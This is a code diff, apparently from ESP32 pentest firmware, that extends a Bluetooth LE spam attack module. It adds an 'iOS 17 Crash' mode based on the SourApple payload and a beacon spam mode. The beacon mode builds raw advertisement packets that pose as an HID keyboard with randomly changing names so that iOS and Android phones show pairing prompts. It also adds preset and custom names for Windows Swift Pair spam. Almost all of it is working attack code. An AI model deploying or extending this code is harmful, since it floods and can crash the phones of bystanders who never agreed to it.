@@ -484,8 +484,48 @@ enum BleSpamAttackType {
     BLE_SPAM_ATTACK_ANDROID_ALERT,
     BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
     BLE_SPAM_ATTACK_SAMSUNG,
+    BLE_SPAM_ATTACK_IOS17_CRASH,
+    BLE_SPAM_ATTACK_BLE_BEACON,
     BLE_SPAM_ATTACK_RANDOM_ALL
 };
+
+#define BLE_SPAM_MAX_CUSTOM_NAMES 20
+
+static std::vector<String> bleSpamLoadCustomNames(const char *ns) {
+    std::vector<String> names;
+#if defined(BLE_SPAM_HAS_PREFERENCES)
+    Preferences prefs;
+    if (prefs.begin(ns, true)) {
+        uint8_t count = prefs.getUChar("count", 0);
+        for (uint8_t i = 0; i < count && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
+            char key[8];
+            snprintf(key, sizeof(key), "n%d", i);
+            String val = prefs.getString(key, "");
+            if (val.length() > 0) names.push_back(val);
+        }
+        prefs.end();
+    }
+#endif
+    return names;
+}
+
+static void bleSpamSaveCustomNames(const char *ns, const std::vector<String> &names) {
+#if defined(BLE_SPAM_HAS_PREFERENCES)
+    Preferences prefs;
+    if (prefs.begin(ns, false)) {
+        prefs.putUChar("count", (uint8_t)names.size());
+        for (size_t i = 0; i < names.size() && i < BLE_SPAM_MAX_CUSTOM_NAMES; i++) {
+            char key[8];
+            snprintf(key, sizeof(key), "n%d", (int)i);
+            prefs.putString(key, names[i]);
+        }
+        prefs.end();
+    }
+#endif
+}
+
+static String bleSpamSwiftPairName = "";
+static String bleSpamBeaconName = "";
 
 enum BleSpamTxPower { BLE_SPAM_TX_MAX, BLE_SPAM_TX_HIGH, BLE_SPAM_TX_MEDIUM, BLE_SPAM_TX_LOW };
 
@@ -571,6 +611,8 @@ static const BleSpamAttackOption BLE_SPAM_ATTACK_OPTIONS[] = {
     {BLE_SPAM_ATTACK_ANDROID_ALERT,      "Android Device Alert"},
     {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, "Windows Swift Pair"  },
     {BLE_SPAM_ATTACK_SAMSUNG,            "Samsung BLE Spam"    },
+    {BLE_SPAM_ATTACK_IOS17_CRASH,        "iOS 17 Crash"        },
+    {BLE_SPAM_ATTACK_BLE_BEACON,         "BLE Beacon Spam"     },
     {BLE_SPAM_ATTACK_RANDOM_ALL,         "Random / All"        }
 };
 
@@ -615,9 +657,20 @@ static const BleSpamAppleDevice BLE_SPAM_APPLE_ACTION_DEVICES[] = {
 };
 #endif
 
-static const char *BLE_SPAM_ANDROID_DEVICES[] = {"Pixel Fast Pair", "Generic Android Alert"};
-static const char *BLE_SPAM_WINDOWS_DEVICES[] = {"Generic Swift Pair"};
-static const char *BLE_SPAM_SAMSUNG_DEVICES[] = {"Galaxy Buds", "Galaxy Watch", "Generic Samsung"};
+static const char *BLE_SPAM_ANDROID_DEVICES[] = {"Pixel Fast Pair", "Generic Android Alert", "Random / All"};
+// Windows: indices 0..3 are presets, 4 = Random/All, 5 = custom name (handled dynamically)
+static const char *BLE_SPAM_WINDOWS_PRESETS[] = {
+    "Generic Swift Pair", "Never gonna give you up", "Bill Nye's iPhone", "Skibidi Toilet", "67"
+};
+static const char *BLE_SPAM_SAMSUNG_DEVICES[] = {
+    "Galaxy Buds", "Galaxy Watch", "Generic Samsung", "Random / All"
+};
+
+// Special sentinel indices
+#define BLE_SPAM_ANDROID_RANDOM_IDX 2
+#define BLE_SPAM_SAMSUNG_RANDOM_IDX 3
+#define BLE_SPAM_WINDOWS_RANDOM_IDX 5 // after presets
+#define BLE_SPAM_WINDOWS_CUSTOM_IDX 6 // "+ Add New Custom Name" / custom saved
 
 static const char *bleSpamTxPowerLabel(BleSpamTxPower level) {
     switch (level) {
@@ -855,49 +908,92 @@ static int bleSpamGetDeviceCount(BleSpamAttackType type) {
     switch (type) {
 #if !defined(LITE_VERSION)
         case BLE_SPAM_ATTACK_APPLE_PAIRING:
-            return sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice);
+            return sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice) + 1; // +1 Random/All
         case BLE_SPAM_ATTACK_APPLE_ACTION:
-            return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice);
+            return sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice) + 1; // +1 Spam All
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
             return sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0]);
-        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR:
-            return sizeof(BLE_SPAM_WINDOWS_DEVICES) / sizeof(BLE_SPAM_WINDOWS_DEVICES[0]);
+        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
+            // presets + Random/All + saved custom names + "+ Add New Custom Name"
+            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
+            return (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0])) + 1 +
+                   (int)saved.size() + 1;
+        }
         case BLE_SPAM_ATTACK_SAMSUNG:
             return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
+        case BLE_SPAM_ATTACK_IOS17_CRASH: return 1;
+        case BLE_SPAM_ATTACK_BLE_BEACON: {
+            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
+            return 1 + (int)saved.size() + 1; // Random Device Spam + saved + Add New
+        }
         default: return 0;
     }
 }
 
+// Static buffer for dynamic device names returned by bleSpamGetDeviceName
+static char bleSpamDeviceNameBuf[48];
+
 static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
     switch (type) {
 #if !defined(LITE_VERSION)
-        case BLE_SPAM_ATTACK_APPLE_PAIRING:
-            if (index >= 0 &&
-                index < (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice)))
-                return BLE_SPAM_APPLE_PAIRING_DEVICES[index].ui_name;
+        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
+            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice));
+            if (index >= 0 && index < staticCount) return BLE_SPAM_APPLE_PAIRING_DEVICES[index].ui_name;
+            if (index == staticCount) return "Random / All";
             return "Apple";
-        case BLE_SPAM_ATTACK_APPLE_ACTION:
-            if (index >= 0 &&
-                index < (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice)))
-                return BLE_SPAM_APPLE_ACTION_DEVICES[index].ui_name;
+        }
+        case BLE_SPAM_ATTACK_APPLE_ACTION: {
+            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice));
+            if (index >= 0 && index < staticCount) return BLE_SPAM_APPLE_ACTION_DEVICES[index].ui_name;
+            if (index == staticCount) return "Spam All";
             return "Apple";
+        }
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
             if (index >= 0 &&
                 index < (int)(sizeof(BLE_SPAM_ANDROID_DEVICES) / sizeof(BLE_SPAM_ANDROID_DEVICES[0])))
                 return BLE_SPAM_ANDROID_DEVICES[index];
             return "Android";
-        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR:
-            if (index >= 0 &&
-                index < (int)(sizeof(BLE_SPAM_WINDOWS_DEVICES) / sizeof(BLE_SPAM_WINDOWS_DEVICES[0])))
-                return BLE_SPAM_WINDOWS_DEVICES[index];
+        case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
+            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
+            if (index >= 0 && index < nPresets) return BLE_SPAM_WINDOWS_PRESETS[index];
+            if (index == nPresets) return "Random / All";
+            // saved custom names
+            std::vector<String> saved = bleSpamLoadCustomNames("bs_sp");
+            int savedBase = nPresets + 1;
+            int addNewIdx = savedBase + (int)saved.size();
+            if (index >= savedBase && index < addNewIdx) {
+                strncpy(
+                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
+                );
+                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
+                return bleSpamDeviceNameBuf;
+            }
+            if (index == addNewIdx) return "+ Add New Custom Name";
             return "Windows";
+        }
         case BLE_SPAM_ATTACK_SAMSUNG:
             if (index >= 0 &&
                 index < (int)(sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0])))
                 return BLE_SPAM_SAMSUNG_DEVICES[index];
             return "Samsung";
+        case BLE_SPAM_ATTACK_IOS17_CRASH: return "iOS 17 Crash";
+        case BLE_SPAM_ATTACK_BLE_BEACON: {
+            if (index == 0) return "Random Device Spam";
+            std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
+            int savedBase = 1;
+            int addNewIdx = savedBase + (int)saved.size();
+            if (index >= savedBase && index < addNewIdx) {
+                strncpy(
+                    bleSpamDeviceNameBuf, saved[index - savedBase].c_str(), sizeof(bleSpamDeviceNameBuf) - 1
+                );
+                bleSpamDeviceNameBuf[sizeof(bleSpamDeviceNameBuf) - 1] = '\0';
+                return bleSpamDeviceNameBuf;
+            }
+            if (index == addNewIdx) return "+ Add New Custom Name";
+            return "Beacon";
+        }
         case BLE_SPAM_ATTACK_RANDOM_ALL:
         default: return "Random / All";
     }
@@ -915,17 +1011,23 @@ static int bleSpamFindApplePayloadIndex(const char *payloadName) {
 static int bleSpamGetApplePayloadIndex(BleSpamAttackType type, int deviceIndex) {
     switch (type) {
         case BLE_SPAM_ATTACK_APPLE_PAIRING: {
-            if (deviceIndex < 0 ||
-                deviceIndex >= (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice))) {
-                return 0;
+            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_PAIRING_DEVICES) / sizeof(BleSpamAppleDevice));
+            if (deviceIndex == staticCount) {
+                // Random/All — pick random pairing payload
+                return random(getApplePayloadCount() / 2); // pairing payloads are first half
             }
+            if (deviceIndex < 0 || deviceIndex >= staticCount) return 0;
             return bleSpamFindApplePayloadIndex(BLE_SPAM_APPLE_PAIRING_DEVICES[deviceIndex].payload_name);
         }
         case BLE_SPAM_ATTACK_APPLE_ACTION: {
-            if (deviceIndex < 0 ||
-                deviceIndex >= (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice))) {
-                return 0;
+            int staticCount = (int)(sizeof(BLE_SPAM_APPLE_ACTION_DEVICES) / sizeof(BleSpamAppleDevice));
+            if (deviceIndex == staticCount) {
+                // Spam All — cycle through all action payloads randomly
+                return bleSpamFindApplePayloadIndex(
+                    BLE_SPAM_APPLE_ACTION_DEVICES[random(staticCount)].payload_name
+                );
             }
+            if (deviceIndex < 0 || deviceIndex >= staticCount) return 0;
             return bleSpamFindApplePayloadIndex(BLE_SPAM_APPLE_ACTION_DEVICES[deviceIndex].payload_name);
         }
         default: return 0;
@@ -941,12 +1043,15 @@ static void bleSpamPickRandomSelection(BleSpamAttackType &attackType, int &devic
 
     AttackCount counts[] = {
 #if !defined(LITE_VERSION)
-        {BLE_SPAM_ATTACK_APPLE_PAIRING,      bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_PAIRING)     },
-        {BLE_SPAM_ATTACK_APPLE_ACTION,       bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_ACTION)      },
+        {BLE_SPAM_ATTACK_APPLE_PAIRING,
+                                  bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_PAIRING) - 1                                   }, // -1 to exclude Random/All sentinel
+        {BLE_SPAM_ATTACK_APPLE_ACTION,       bleSpamGetDeviceCount(BLE_SPAM_ATTACK_APPLE_ACTION) - 1},
 #endif
-        {BLE_SPAM_ATTACK_ANDROID_ALERT,      bleSpamGetDeviceCount(BLE_SPAM_ATTACK_ANDROID_ALERT)     },
-        {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR, bleSpamGetDeviceCount(BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR)},
-        {BLE_SPAM_ATTACK_SAMSUNG,            bleSpamGetDeviceCount(BLE_SPAM_ATTACK_SAMSUNG)           }
+        {BLE_SPAM_ATTACK_ANDROID_ALERT,      2                                                      }, // only Pixel + Generic, not Random/All
+        {BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR,
+                                  (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))              },
+        {BLE_SPAM_ATTACK_SAMSUNG,            3                                                      }, // Galaxy Buds/Watch/Generic only
+        {BLE_SPAM_ATTACK_IOS17_CRASH,        1                                                      }
     };
 
     int total = 0;
@@ -1021,6 +1126,13 @@ static void bleSpamFastRandomMac(uint8_t *mac) {
     mac[0] = (mac[0] & 0xFE) | 0x02;
 }
 
+// 16-char printable ASCII name, regenerated every call via xorshift — used for beacon random spam
+static void bleSpamRandomBeaconName(char *buf) {
+    const uint8_t len = 16;
+    for (uint8_t i = 0; i < len; i++) { buf[i] = 0x21 + (uint8_t)(bleSpamNextRand64() % 94); }
+    buf[len] = '\0';
+}
+
 static bool bleSpamGetNextMac(BleSpamRunState &state, BleSpamMacRandMode mode, uint8_t outMac[6]) {
     if (mode == BLE_SPAM_MAC_OFF) {
         if (!state.mac_initialized) {
@@ -1061,24 +1173,101 @@ static bool bleSpamBuildAdvertisementData(
         }
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
-            advertisementData = GetUniversalAdvertisementData(Google);
+            if (deviceIndex == BLE_SPAM_ANDROID_RANDOM_IDX) {
+                // Random between Pixel Fast Pair and Generic
+                advertisementData = GetUniversalAdvertisementData(Google);
+            } else {
+                advertisementData = GetUniversalAdvertisementData(Google);
+            }
             advertisementData.setFlags(0x06);
             return true;
         case BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR: {
-            String name = bleSpamGetDeviceName(attackType, deviceIndex);
+            int nPresets = (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]));
+            String name;
+            if (deviceIndex == nPresets) {
+                // Random/All — pick random preset
+                name = String(BLE_SPAM_WINDOWS_PRESETS[random(nPresets)]);
+            } else if (deviceIndex >= 0 && deviceIndex < nPresets) {
+                name = String(BLE_SPAM_WINDOWS_PRESETS[deviceIndex]);
+            } else {
+                // custom saved name
+                name = bleSpamSwiftPairName.length() > 0 ? bleSpamSwiftPairName
+                                                         : String(BLE_SPAM_WINDOWS_PRESETS[0]);
+            }
             advertisementData = GetUniversalAdvertisementData(Microsoft, name);
             advertisementData.setFlags(0x06);
             return true;
         }
         case BLE_SPAM_ATTACK_SAMSUNG:
-            advertisementData = GetUniversalAdvertisementData(Samsung);
+            if (deviceIndex == BLE_SPAM_SAMSUNG_RANDOM_IDX) {
+                advertisementData = GetUniversalAdvertisementData(Samsung);
+            } else {
+                advertisementData = GetUniversalAdvertisementData(Samsung);
+            }
             advertisementData.setFlags(0x06);
             return true;
+        case BLE_SPAM_ATTACK_IOS17_CRASH:
+            advertisementData = GetUniversalAdvertisementData(SourApple);
+            advertisementData.setFlags(0x06);
+            return true;
+        case BLE_SPAM_ATTACK_BLE_BEACON: {
+            // Build a properly structured raw AD packet that triggers pairing prompts
+            // on both iOS and Android system Bluetooth settings.
+            //
+            // Packet structure (all AD elements):
+            //   [0x02, 0x01, 0x06]              — Flags: LE General Discoverable, BR/EDR Not Supported
+            //   [0x03, 0x03, 0x12, 0x18]        — Complete 16-bit UUID list: HID (0x1812 LE)
+            //   [0x04, 0x19, 0x80, 0x01, 0x00]  — Appearance: HID Keyboard (0x0180 LE) — causes
+            //                                      iOS/Android to show keyboard pairing prompt
+            //   [len,  0x09, ...name...]         — Complete Local Name
+            String name;
+            char randomBuf[17];
+            if (bleSpamBeaconName.length() > 0) {
+                name = bleSpamBeaconName;
+            } else {
+                bleSpamRandomBeaconName(randomBuf);
+                name = String(randomBuf);
+            }
+            uint8_t nameLen = (uint8_t)min((int)name.length(), 20);
+
+            uint8_t packet[31];
+            uint8_t i = 0;
+
+            // Flags
+            packet[i++] = 0x02;
+            packet[i++] = 0x01;
+            packet[i++] = 0x06;
+            // Complete list of 16-bit UUIDs: HID service
+            packet[i++] = 0x03;
+            packet[i++] = 0x03;
+            packet[i++] = 0x12;
+            packet[i++] = 0x18;
+            // Appearance: HID Keyboard (0x0180 in little-endian = 0x80, 0x01)
+            packet[i++] = 0x03;
+            packet[i++] = 0x19;
+            packet[i++] = 0x80;
+            packet[i++] = 0x01;
+            // Complete Local Name
+            packet[i++] = nameLen + 1;
+            packet[i++] = 0x09;
+            memcpy(&packet[i], name.c_str(), nameLen);
+            i += nameLen;
+
+#ifdef NIMBLE_V2_PLUS
+            advertisementData.addData(packet, i);
+#else
+            std::vector<uint8_t> dataVec(packet, packet + i);
+            advertisementData.addData(dataVec);
+#endif
+            return true;
+        }
         default: return false;
     }
 }
 
 static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
+    // beacon with empty name = random every packet, never cache
+    if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) return false;
     return attackType == BLE_SPAM_ATTACK_APPLE_PAIRING || attackType == BLE_SPAM_ATTACK_APPLE_ACTION ||
            attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR;
 }
@@ -1211,6 +1400,12 @@ bleSpamSendTick(BleSpamRunState &state, const BleSpamConfig &config, const BleSp
         }
 
         if (!pAdvertising) return;
+
+        // For beacon random spam, force a stop before setting new data so NimBLE
+        // flushes the payload and picks up the new name every packet
+        if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) {
+            pAdvertising->stop();
+        }
 
         const BLEAdvertisementData *advertisementData =
             bleSpamSelectAdvertisement(state, attackType, deviceIndex);
@@ -1623,6 +1818,97 @@ static void bleSpamRunScreen(const BleSpamSelection &selection, BleSpamConfig &c
     } while (restart);
 }
 
+// Show a 2-option popup. Returns 0 for first option, 1 for second, -1 for ESC.
+static int bleSpamTwoOptionPrompt(const String &title, const char *opt0, const char *opt1) {
+    int cursor = 0;
+    bool redraw = true;
+    bool layoutDrawn = false;
+    while (true) {
+        if (redraw) {
+            if (!layoutDrawn) {
+                drawMainBorderWithTitle(bleSpamMakeTitle(title));
+                layoutDrawn = true;
+            }
+            int rowH = max(12, FP * LH + 4);
+            int startY = BORDER_PAD_Y + FM * LH + 16;
+            for (int i = 0; i < 2; i++) {
+                int rowY = startY + i * rowH;
+                bool sel = (i == cursor);
+                uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
+                uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
+                tft.fillRect(10, rowY, tftWidth - 20, rowH, bg);
+                tft.setTextColor(fg, bg);
+                tft.setTextSize(FP);
+                tft.drawString(String(sel ? "> " : "  ") + (i == 0 ? opt0 : opt1), 14, rowY + 2, 1);
+            }
+            redraw = false;
+        }
+        if (EscPress && PrevPress) EscPress = false;
+        if (check(EscPress)) return -1;
+        if (check(NextPress)) {
+            cursor = (cursor + 1) % 2;
+            redraw = true;
+        } else if (check(PrevPress)) {
+            cursor = (cursor + 1) % 2;
+            redraw = true;
+        } else if (check(SelPress)) return cursor;
+    }
+}
+
+// Handle device selection for types with custom name lists (Swift Pair and Beacon)
+// Returns true if a device/name was chosen and selection is ready to run.
+// Sets bleSpamSwiftPairName / bleSpamBeaconName as side-effect.
+static bool bleSpamHandleCustomNameDevice(
+    BleSpamAttackType type, int deviceIndex, BleSpamSelection &selection, BleSpamConfig &config,
+    bool &configChanged
+) {
+    const char *ns = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? "bs_sp" : "bs_bn";
+    String &nameVar = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? bleSpamSwiftPairName : bleSpamBeaconName;
+
+    int nPresets = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR)
+                       ? (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))
+                       : 0;
+    int randomIdx = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? nPresets : -1;
+    int savedBase = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? nPresets + 1 : 1;
+
+    std::vector<String> saved = bleSpamLoadCustomNames(ns);
+    int addNewIdx = savedBase + (int)saved.size();
+
+    if (deviceIndex == addNewIdx) {
+        // User tapped "+ Add New Custom Name"
+        String newName = keyboard("", 24, "Enter name");
+        if (newName == "\x1B" || newName.length() == 0) return false;
+        saved.push_back(newName);
+        bleSpamSaveCustomNames(ns, saved);
+        nameVar = newName;
+        selection.device_index = deviceIndex; // point at the newly saved name
+        return false;                         // don't auto-start, let them select it from list next time
+    }
+
+    if (deviceIndex >= savedBase && deviceIndex < addNewIdx) {
+        // It's a saved custom name — show Use/Delete prompt
+        int choice = bleSpamTwoOptionPrompt(
+            String(saved[deviceIndex - savedBase]), "Use Saved Name", "Delete Saved Name"
+        );
+        if (choice == 1) {
+            // Delete
+            saved.erase(saved.begin() + (deviceIndex - savedBase));
+            bleSpamSaveCustomNames(ns, saved);
+            return false;
+        } else if (choice == 0) {
+            nameVar = saved[deviceIndex - savedBase];
+            selection.device_index = deviceIndex;
+            return true; // proceed to config+run
+        }
+        return false;
+    }
+
+    // Preset or Random/All — clear custom name var, just run
+    nameVar = "";
+    selection.device_index = deviceIndex;
+    return true;
+}
+
 static void bleSpamMenuUi() {
     BleSpamConfig config = bleSpamLoadConfig();
     bool configChanged = false;
@@ -1642,7 +1928,9 @@ static void bleSpamMenuUi() {
         selection.attack_type = bleSpamGetAttackTypeByIndex(attackIndex);
         selection.device_index = 0;
 
-        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL) {
+        // Types that go straight to config without a device list
+        if (selection.attack_type == BLE_SPAM_ATTACK_RANDOM_ALL ||
+            selection.attack_type == BLE_SPAM_ATTACK_IOS17_CRASH) {
             while (true) {
                 bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
                 bleSpamSaveConfig(config);
@@ -1653,6 +1941,7 @@ static void bleSpamMenuUi() {
             continue;
         }
 
+        // Types with a device/name list
         while (true) {
             int deviceCount = bleSpamGetDeviceCount(selection.attack_type);
             int deviceIndex = bleSpamListLoop(
@@ -1664,7 +1953,17 @@ static void bleSpamMenuUi() {
             );
 
             if (deviceIndex < 0) break;
-            selection.device_index = deviceIndex;
+
+            // Swift Pair and Beacon need custom name handling
+            if (selection.attack_type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR ||
+                selection.attack_type == BLE_SPAM_ATTACK_BLE_BEACON) {
+                bool readyToRun = bleSpamHandleCustomNameDevice(
+                    selection.attack_type, deviceIndex, selection, config, configChanged
+                );
+                if (!readyToRun) continue;
+            } else {
+                selection.device_index = deviceIndex;
+            }
 
             while (true) {
                 bool startAttack = bleSpamConfigScreen(selection, config, configChanged);
